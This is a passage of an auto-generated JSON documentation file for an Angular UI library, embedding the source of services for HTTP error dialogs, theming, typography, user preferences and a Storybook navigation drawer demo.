      "sourceCode": "import { Inject, Injectable, Optional } from '@angular/core';\nimport { HttpErrorResponse } from '@angular/common/http';\nimport { Action, HttpError } from './http-error';\nimport { ErrorHandler, ErrorLogger, Handler } from './error-handler';\nimport { ErrorDialogService } from './error-dialog.service';\nimport { CUSTOM_ERROR_HANDLER, ERROR_LOGGER } from './token';\n\n@Injectable({\n  providedIn: 'root'\n})\n/**\n * Service used to handle errors across our applications. Replaces the previous HttpErrorHandler\n */\nexport class ErrorHandlerService implements ErrorHandler {\n\n  constructor(\n    private errorDialogService: ErrorDialogService,\n    // Optional custom error handler.\n    @Optional() @Inject(CUSTOM_ERROR_HANDLER) private customHandler: ErrorHandler,\n    // Optional logger. Nothing is logged if logger is not provided.\n    @Optional() @Inject(ERROR_LOGGER) private logger: ErrorLogger,\n  ) {\n  }\n\n  /**\n   * Global handler. This method will try (in order): passed in handler -> custom handler -> default handler for code -> defaultHandler\n   * All errors are passed to a dialog to be displayed there, and will by default have a simple \"OK\" button to close.\n   * @param err\n   * @param handler\n   */\n  handler(err: HttpErrorResponse, handler?: Handler) {\n    let fn: Handler | undefined;\n    let actions: Action[] = [];\n    fn = handler;\n    if ( !fn && this.customHandler ) {\n      fn = this.customHandler[ err.status ] || this.customHandler.defaultHandler;\n    }\n    if ( !fn ) {\n      fn = this[ err.status ] || this.defaultHandler as Handler;\n      actions = [\n        { label: 'OK' }\n      ];\n    }\n    // Ensure we bind the function to the correct context.\n    const error = fn.bind(this)(err);\n    // Add a default \"OK\" action, but only if the global handlers are used.\n    // OK is also shown if no actions are passed in.\n    error.actions = [ ...actions, ...error.actions ];\n    if ( this.logger ) {\n      // Apply logger if available.\n      this.logger.log(error);\n    }\n    this.errorDialogService.open(error);\n  }\n\n  // Fallback handler if unknown code\n  defaultHandler(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = `Application error`;\n    const errorText = this.getErrorText(err);\n    error.text = `The application experienced an unknown or unexpected exception. The exception is listed below:\n    ${errorText}`;\n    error.actions = [\n      new Action('Refresh', () => window.location.reload())\n    ];\n    return error;\n  }\n\n  // Signature for error handlers\n  [ code: number ]: Handler;\n\n  0(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'No connection';\n    const offline = !window.navigator.onLine;\n    if ( offline ) {\n      error.text = `You are not connected to the internet.`;\n    } else {\n      error.text = `We were unable to establish a connection to the server. There can be several reasons for this:\n\n    - There was an intermittent connection loss\n    - The request timed out`;\n    }\n    return error;\n  }\n\n  400(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Errors in submitted form';\n    const errorText = this.getErrorText(err);\n    error.text = `The form contained invalid data.\n\n    ${errorText}`;\n    return error;\n  }\n\n  401(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = `Not signed in`;\n    error.text = `You are not signed in or your session has expired. Please sign in and try again.`;\n    error.actions = [];\n    return error;\n  }\n\n  403(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = `Not authorized.`;\n    error.text = `You do not have access to perform this action.\n    Apply for the correct roles in Access IT.`;\n    error.actions = [\n      { label: 'ACCESS IT', action: () => window.open('https://accessit.equinor.com/', '_blank') }\n    ];\n    return error;\n  }\n\n  404(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Item not found';\n    const errorText = this.getErrorText(err);\n    error.text = `The requested item / resource was not found.\n\n    ${errorText}\n    `;\n    return error;\n  }\n\n  409(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'This resource has changed';\n    const errorText = this.getErrorText(err);\n    error.text = `This resource/item has been updated on the server. Please reload and try again.\n\n    ${errorText}`;\n    error.actions = [\n      { label: 'Reload', action: () => window.location.reload() }\n    ];\n    return error;\n  }\n\n  500(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = `Unexpected error occurred`;\n    const errorText = this.getErrorText(err);\n    error.text = `We experienced an unknown exception. Please report this via Services @ Equinor\n\n    ${errorText}`;\n    error.actions = [\n      { label: 'Services @ Equinor', action: () => window.open(`https://equinor.service-now.com`, '_blank') }\n    ];\n    return error;\n  }\n\n  501(err: HttpErrorResponse) {\n    return this[ 500 ](err);\n  }\n\n  503(err: HttpErrorResponse) {\n    return this[ 500 ](err);\n  }\n\n  /**\n   * Uses the getErrorText from the provided custom handler, if available.\n   * Otherwise, return the error message, if available in our desired format\n   * Expected err.error -> { message: 'A message', ... }\n   * Also handles text as a fallback.\n   * */\n  getErrorText(err: HttpErrorResponse) {\n    if ( this.customHandler && this.customHandler.getErrorText ) {\n      return this.customHandler.getErrorText(err);\n    }\n    let errorText: string;\n    try {\n      const e = err.error instanceof Object ? err.error : JSON.parse(err.error);\n      errorText = e.message;\n    } catch ( ex ) {\n      errorText = typeof err.error === 'string' ? err.error : '';\n    }\n    return errorText;\n  }\n\n}\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "errorDialogService",
            "type": "ErrorDialogService",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "customHandler",
            "type": "ErrorHandler",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "logger",
            "type": "ErrorLogger",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 14,
        "jsdoctags": [
          {
            "name": "errorDialogService",
            "type": "ErrorDialogService",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "customHandler",
            "type": "ErrorHandler",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "logger",
            "type": "ErrorLogger",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "type": "injectable"
    },
    {
      "name": "IconService",
      "id": "injectable-IconService-4ef0d4d909e383286b6def41da71b137b75525a6bb8318194ab7a6bf1a6da03449aa0d575070a228265da3edd338ea05e9b8ae4314f495d9643cc65331bf65b5",
      "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
      "properties": [],
      "methods": [],
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\nimport { moduleMetadata } from '@storybook/angular';\nimport { MatButtonModule } from '@angular/material/button';\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\nimport { MatIconModule, MatIconRegistry } from '@angular/material/icon';\nimport { NavDrawerComponent, NavDrawerModule, Navigation } from '@ngx-stoui/drawer';\nimport { RouterTestingModule } from '@angular/router/testing';\nimport { BrowserModule } from '@angular/platform-browser';\nimport { CommonModule } from '@angular/common';\nimport { Component, Injectable } from '@angular/core';\nimport { StoAppHeaderModule } from '@ngx-stoui/common';\nimport { action } from '@storybook/addon-actions';\n\n@Component({\n  selector: 'wrapper',\n  template: 'Hi'\n})\nclass WrapperComponent {\n}\n\n@Injectable({ providedIn: 'root' })\nclass IconService {\n  constructor(private iconReg: MatIconRegistry) {\n    this.iconReg.setDefaultFontSetClass('material-icons-outline');\n  }\n}\n\nexport default {\n  title: 'Navigation/Drawer',\n  component: NavDrawerComponent,\n  parameters: {},\n  decorators: [\n    moduleMetadata({\n      declarations: [ WrapperComponent ],\n      providers: [ IconService ],\n      imports: [\n        NavDrawerModule,\n        StoAppHeaderModule,\n        MatIconModule,\n        MatButtonModule,\n        BrowserAnimationsModule,\n        RouterTestingModule.withRoutes([\n          { path: '**', component: WrapperComponent }\n        ]),\n        BrowserModule,\n        CommonModule\n      ]\n    })\n  ],\n  argTypes: {\n    open: {\n      control: { type: 'boolean' }\n    }\n  }\n} as Meta;\n\nconst Template: Story<NavDrawerComponent> = (args: NavDrawerComponent) => {\n  return {\n    component: NavDrawerComponent,\n    props: {\n      ...args,\n      activate: action('Activate route')\n    },\n  };\n};\n\nconst navigationItems = [\n  {\n    label: 'Direct route',\n    route: [ '/', 'home' ],\n    icon: 'home'\n  },\n  {\n    label: 'Disabled',\n    route: [ '/', 'home' ],\n    icon: 'do_disturb',\n    disabled: true\n  },\n  {\n    label: 'Internal route title',\n    children: [\n      {\n        route: [ '/', 'disabled', 'route1' ],\n        disabled: true,\n        label: 'Disabled child route',\n      },\n      {\n        route: [ '/', 'route1' ],\n        label: 'Internal child route',\n      },\n      {\n        route: [ '/', 'route2' ],\n        label: 'Internal child route 2',\n      },\n      {\n        route: [ '/', 'route3' ],\n        label: 'Internal child route 3',\n      },\n      {\n        route: [ '/', 'route4' ],\n        label: 'Internal child route 4',\n      },\n      {\n        route: [ '/', 'route5' ],\n        label: 'Internal child route 5',\n      },\n      {\n        route: [ '/', 'route6' ],\n        label: 'Internal child route 6',\n      },\n    ],\n    icon: 'dashboard',\n    title: 'Dashboard'\n  },\n  {\n    label: 'External',\n    divider: 'above',\n    children: [\n      {\n        link: 'https://example.com',\n        target: '_blank',\n        label: 'Example.com',\n      }\n    ],\n    icon: 'open_in_new',\n  },\n  {\n    link: '#',\n    label: 'Disabled Route',\n    children: [],\n    icon: 'do_disturb',\n    disabled: true\n  },\n] as Array<Navigation>;\n\nexport const NormalUse = Template.bind({});\nNormalUse.args = {\n  navigationItems,\n  collapsed: false,\n};\n\n\nexport const WithAppHeader = (args: NavDrawerComponent) => {\n  return {\n    component: NavDrawerComponent,\n    props: { ...args, activate: action('Activate route') },\n    template: `\n    <sto-app-header></sto-app-header>\n    <sto-nav-drawer (activate)=\"collapsed = true; activate($event)\" [withAppHeader]=\"true\" [navigationItems]=\"navigationItems\" [collapsed]=\"collapsed\"></sto-nav-drawer>\n    `\n  };\n};\nWithAppHeader.args = {\n  navigationItems,\n  collapsed: true,\n\n};\n\n\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "iconReg",
            "type": "MatIconRegistry",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 22,
        "jsdoctags": [
          {
            "name": "iconReg",
            "type": "MatIconRegistry",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "type": "injectable"
    },
    {
      "name": "Logger",
      "id": "injectable-Logger-76dbeb67c05168c1d4f6862dbe89f181cf4f845ed02296a6bf6df841971cc943095e99b6be10c7e55350d83683723899f2846b7a0f07c70f177b522e799322a1",
      "file": "libs/error-handler/src/lib/wrapper.ts",
      "properties": [],
      "methods": [
        {
          "name": "log",
          "args": [
            {
              "name": "err",
              "type": "HttpError",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 93,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "err",
              "type": "HttpError",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport {\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\n  ErrorHandlerService,\n  Handler,\n  HttpError,\n  StoErrorHandler\n} from '@ngx-stoui/error-handler';\n\n@Component({\n  selector: 'next-wrapper',\n  template: `\n    <button mat-button\n            (click)=\"overRide(404)\">Overridden 404\n    </button>\n    <button mat-button\n            (click)=\"showError(s)\"\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n  `,\n  providers: []\n})\nexport class NextWrapperComponent {\n  public errors = [\n    0,\n    400,\n    401,\n    403,\n    404,\n    409,\n    500,\n    501,\n    503\n  ];\n\n  constructor(private service: ErrorHandlerService) {\n  }\n\n  showError(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    this.service.handler(err);\n  }\n\n  overRide(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    const handler = function (err: HttpErrorResponse) {\n      const e = new HttpError(err);\n      e.title = 'Local override 404';\n      e.text = 'Local override not found item';\n      return e;\n    };\n    this.service.handler(err, handler);\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class ErrorHandlerImpl implements StoErrorHandler {\n  [ code: number ]: Handler;\n\n  401(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Custom not signed in';\n    error.text = 'Custom not signed in text';\n    return error;\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class Logger {\n  constructor(private http: HttpClient) {\n  }\n\n  log(err: HttpError) {\n    // This method will typically go to the application backend or a central log repository\n    console.log('Error', err);\n  }\n}\n\nfunction LoggerFactory(http: HttpClient) {\n  return new Logger(http);\n}\n\n@NgModule({\n  declarations: [ NextWrapperComponent ],\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\n  exports: [ NextWrapperComponent ],\n  providers: [\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\n  ]\n})\nexport class WrapperModule {\n}\n\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "http",
            "type": "HttpClient",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 89,
        "jsdoctags": [
          {
            "name": "http",
            "type": "HttpClient",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "type": "injectable"
    },
    {
      "name": "StoThemeService",
      "id": "injectable-StoThemeService-e5de4b2cafa3ff58e8493c82e9ced1398475348f1350188739aeba2c7ab6534711a56ffa55b582a433ef70ea32d6d8a28369202293f34f99dffec3db4827cbce",
      "file": "libs/common/src/lib/theme/theme.service.ts",
      "properties": [
        {
          "name": "destroyed$",
          "defaultValue": "new Subject<boolean>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 19,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "document",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Document",
          "optional": false,
          "description": "",
          "line": 22,
          "modifierKind": [
            121,
            144
          ]
        },
        {
          "name": "previousTheme",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ThemeName",
          "optional": false,
          "description": "",
          "line": 17,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "previousTypography",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "TypographyName",
          "optional": false,
          "description": "",
          "line": 18,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "themeObserver",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MutationObserver",
          "optional": false,
          "description": "",
          "line": 20,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "themeSubject$",
          "defaultValue": "new BehaviorSubject<ThemeName>('light')",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 15,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "typographyObserver",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MutationObserver",
          "optional": false,
          "description": "",
          "line": 21,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "typographySubject$",
          "defaultValue": "new BehaviorSubject<TypographyName>('medium')",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 16,
          "modifierKind": [
            121
          ]
        }
      ],
      "methods": [
        {
          "name": "getActiveTheme",
          "args": [],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 67,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "getActiveTypography",
          "args": [],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 76,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "getInitialValuesFromStorage",
          "args": [],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 152,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121,
            131
          ]
        },
        {
          "name": "listenForBodyClassChangesToTheme",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 85,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "listenForBodyClassChangesToTypography",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 120,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 43,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "setTheme",
          "args": [
            {
              "name": "theme",
              "type": "ThemeName",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 50,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "theme",
              "type": "ThemeName",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setThemeClass",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 111,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "setTypography",
          "args": [
            {
              "name": "variant",
              "type": "TypographyName",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 59,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "variant",
              "type": "TypographyName",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setTypographyClass",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 143,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Inject, Injectable, OnDestroy, Optional } from '@angular/core';\nimport { BehaviorSubject, Observable, Subject } from 'rxjs';\nimport { ThemeModel, ThemeName, themes, typography, TypographyName } from './models';\nimport { map, take, takeUntil } from 'rxjs/operators';\nimport { DOCUMENT } from '@angular/common';\nimport { THEME_SAVER, ThemeSaver, ThemeSaverService } from './theme-saver.service';\nimport { MatIconRegistry } from '@angular/material/icon';\nimport { DomSanitizer } from '@angular/platform-browser';\nimport { iconMap } from './svg-icons';\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class StoThemeService implements OnDestroy {\n  private themeSubject$ = new BehaviorSubject<ThemeName>('light');\n  private typographySubject$ = new BehaviorSubject<TypographyName>('medium');\n  private previousTheme: ThemeName;\n  private previousTypography: TypographyName;\n  private destroyed$ = new Subject<boolean>();\n  private themeObserver: MutationObserver;\n  private typographyObserver: MutationObserver;\n  private readonly document: Document;\n\n  constructor(@Inject(DOCUMENT) document: Document,\n              private iconRegistry: MatIconRegistry,\n              private sanitizer: DomSanitizer,\n              @Optional() @Inject(THEME_SAVER) private readonly saver: ThemeSaver<Observable<ThemeModel>>) {\n    if ( !this.saver ) {\n      this.saver = new ThemeSaverService();\n    }\n    this.document = document as Document;\n    this.listenForBodyClassChangesToTheme();\n    this.listenForBodyClassChangesToTypography();\n    this.setThemeClass();\n    this.setTypographyClass();\n    this.getInitialValuesFromStorage();\n    this.document.body.classList.add('mat-app-background');\n    this.iconRegistry.setDefaultFontSetClass('material-icons-outlined');\n    const icon = this.sanitizer.bypassSecurityTrustHtml(iconMap.get('equinor') as string) as string;\n    this.iconRegistry.addSvgIconLiteral('equinor', icon);\n  }\n\n  ngOnDestroy() {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n    this.themeObserver.disconnect();\n    this.typographyObserver.disconnect();\n  }\n\n  setTheme(theme: ThemeName) {\n    if ( !theme || !themes.has(theme) ) {\n      const preferDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;\n      theme = preferDark ? 'dark' : 'light';\n    }\n    this.themeSubject$.next(theme);\n    return this.saver.save({ type: 'theme', value: theme });\n  }\n\n  setTypography(variant: TypographyName) {\n    if ( !variant || !typography.has(variant) ) {\n      variant = 'medium';\n    }\n    this.typographySubject$.next(variant);\n    return this.saver.save({ type: 'typography', value: variant });\n  }\n\n  getActiveTheme() {\n    return this.themeSubject$\n      .asObservable()\n      .pipe(map(val => ( {\n        name: val,\n        className: themes.get(val)\n      } )));\n  }\n\n  getActiveTypography() {\n    return this.typographySubject$\n      .asObservable()\n      .pipe(map(val => ( {\n        name: val,\n        className: typography.get(val)\n      } )));\n  }\n\n  private listenForBodyClassChangesToTheme() {\n    const body = this.document.body;\n    this.themeObserver = new MutationObserver((mutations) => {\n      mutations.forEach(m => {\n        const t = m.target as HTMLBodyElement;\n        const darkmode = t.classList.contains('sto-dark-theme');\n        const themeName = darkmode ? 'dark' : 'light';\n        if ( this.previousTheme === themeName ) {\n          return;\n        }\n        this.previousTheme = themeName;\n        if ( darkmode ) {\n          this.setTheme('dark');\n        } else {\n          this.setTheme('light');\n        }\n      });\n    });\n    this.themeObserver.observe(body, {\n      attributes: true,\n      attributeFilter: [ 'class' ],\n      childList: false,\n      characterData: false\n    });\n  }\n\n  private setThemeClass() {\n    this.getActiveTheme()\n      .pipe(takeUntil(this.destroyed$))\n      .subscribe((theme) => {\n        this.document.body.classList.remove('sto-dark-theme', 'sto-light-theme');\n        this.document.body.classList.add(themes.get(theme.name) ?? '');\n      });\n  }\n\n  private listenForBodyClassChangesToTypography() {\n    const body = this.document.body;\n    this.typographyObserver = new MutationObserver((mutations) => {\n      mutations.forEach(m => {\n        const t = m.target as HTMLBodyElement;\n        const small = t.classList.contains(typography.get('small') ?? '');\n        const large = t.classList.contains(typography.get('large') ?? '');\n        const typographyName: TypographyName = small ? 'small' : large ? 'large' : 'medium';\n        if ( this.previousTypography === typographyName ) {\n          return;\n        }\n        this.previousTypography = typographyName;\n        this.setTypography(typographyName);\n      });\n    });\n    this.typographyObserver.observe(body, {\n      attributes: true,\n      attributeFilter: [ 'class' ],\n      childList: false,\n      characterData: false\n    });\n  }\n\n  private setTypographyClass() {\n    this.getActiveTypography()\n      .pipe(takeUntil(this.destroyed$))\n      .subscribe((typo) => {\n        this.document.body.classList.remove(...typography.values());\n        this.document.body.classList.add(typo.className ?? '');\n      });\n  }\n\n  private async getInitialValuesFromStorage() {\n    try {\n      const theme = await this.saver.load('theme')\n        .pipe(take(1))\n        .toPromise();\n      this.setTheme(theme.value as ThemeName);\n      const typo = await this.saver.load('typography')\n        .pipe(take(1))\n        .toPromise();\n      this.setTypography(typo.value as TypographyName);\n    } catch {\n      // gotta catch em all\n    }\n  }\n}\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "document",
            "type": "Document",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "iconRegistry",
            "type": "MatIconRegistry",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "sanitizer",
            "type": "DomSanitizer",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "saver",
            "type": "ThemeSaver<Observable<ThemeModel>>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 22,
        "jsdoctags": [
          {
            "name": "document",
            "type": "Document",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "iconRegistry",
            "type": "MatIconRegistry",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "sanitizer",
            "type": "DomSanitizer",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "saver",
            "type": "ThemeSaver<Observable<ThemeModel>>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "type": "injectable"
    },
    {
      "name": "StoUserPreferenceService",
      "id": "injectable-StoUserPreferenceService-a6d6e1b69a672752b93e837c8ec5a933e3f2aa4f1346fbe2d36269015d909c042eb228bbc52f0f1ff673ef34008c87c73ada7bf6d3056b8e6ac7b8f6a6002b55",
      "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
      "properties": [
        {
          "name": "default",
          "defaultValue": "{\n    hasSelectTextOnFocusEnabled: true\n  }",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "object",
          "optional": false,
          "description": "",
          "line": 13,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "hasSelectTextOnFocusEnabled",
          "defaultValue": "new BehaviorSubject<boolean>(true)",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 9,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "preferences",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "literal type",
          "optional": false,
          "description": "",
          "line": 10,
          "modifierKind": [
            123
          ]
        }
      ],
      "methods": [
        {
          "name": "getPreferences",
          "args": [],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 36,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ]
        },
        {
          "name": "setHasSelectTextOnFocusEnabled",
          "args": [
            {
              "name": "value",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 30,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "value",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setPreferences",
          "args": [
            {
              "name": "value",
              "type": "Record<string | >",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 40,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "value",
              "type": "Record<string | >",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { Injectable } from '@angular/core';\nimport { BehaviorSubject } from 'rxjs';\n\nconst preferenceKey = 'TOPS_IM:UserPreferences';\n\n@Injectable()\nexport class StoUserPreferenceService {\n\n  public hasSelectTextOnFocusEnabled = new BehaviorSubject<boolean>(true);\n  public preferences: {\n    hasSelectTextOnFocusEnabled: boolean;\n  };\n  public default = {\n    hasSelectTextOnFocusEnabled: true\n  };\n\n\n  constructor() {\n    let sessionPreferences = {};\n    const sessionPreferencesString = this.getPreferences();\n    try {\n      sessionPreferences = JSON.parse(sessionPreferencesString);\n    } catch ( e ) {\n      console.error('Unable to parse the preferences from local storage. Loading default');\n    }\n    this.preferences = { ...this.default, ...sessionPreferences };\n    this.setHasSelectTextOnFocusEnabled(this.preferences.hasSelectTextOnFocusEnabled);\n  }\n\n  public setHasSelectTextOnFocusEnabled(value: boolean) {\n    this.hasSelectTextOnFocusEnabled.next(value);\n    this.preferences.hasSelectTextOnFocusEnabled = value;\n    this.setPreferences(this.preferences);\n  }\n\n  public getPreferences() {\n    return sessionStorage.getItem(preferenceKey) || '{}';\n  }\n\n  public setPreferences(value: Record<string, unknown>) {\n    sessionStorage.setItem(preferenceKey, JSON.stringify(value));\n  }\n}\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [],
        "line": 15
      },
      "type": "injectable"
    },
    {
      "name": "ThemeSaverService",
      "id": "injectable-ThemeSaverService-4182d21ac72cc0f1436506bf222ee3fb19d625be207791f314fd0e1ea1e3e0d2942224d5732ae7333563f0b0377f713bb40c03f5a7a05e063a1ca72d27123e34",
      "file": "libs/common/src/lib/theme/theme-saver.service.ts",
      "properties": [],
      "methods": [
        {
          "name": "load",
          "args": [
            {
              "name": "type",
              "type": "\"typography\" | \"theme\"",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "Observable<ThemeModel>",
          "typeParameters": [],
          "line": 19,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "type",
              "type": "\"typography\" | \"theme\"",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "save",
          "args": [
            {
              "name": "model",
              "type": "ThemeModel",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "Observable<ThemeModel>",
          "typeParameters": [],
          "line": 27,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "model",
              "type": "ThemeModel",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
